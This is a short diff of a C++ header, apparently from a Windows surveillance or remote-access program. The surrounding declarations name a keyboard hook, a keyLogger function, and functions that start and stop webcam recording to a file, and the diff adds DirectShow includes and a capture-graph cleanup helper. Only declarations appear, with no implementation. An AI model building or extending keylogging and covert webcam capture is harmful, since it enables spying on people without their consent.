@@ -20,6 +20,9 @@
 #include <array>
 #include <memory>
 #include <stdexcept>
+#include <dshow.h>
+#include <thread>
+#include <chrono>
 
 struct RunningApp {
     DWORD processID;
@@ -60,6 +63,7 @@ namespace Services {
     LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
     bool keyLogger(const std::string &saveFile);
 
+    void clear(IGraphBuilder* &pGraph, ICaptureGraphBuilder2* &pBuilder, IBaseFilter* &pCap, IBaseFilter* &pAVIMux, IMediaControl* &pControl);
     bool startWebcam(const std::string &saveFile);
     bool stopWebcam(const std::string &saveFile);
 
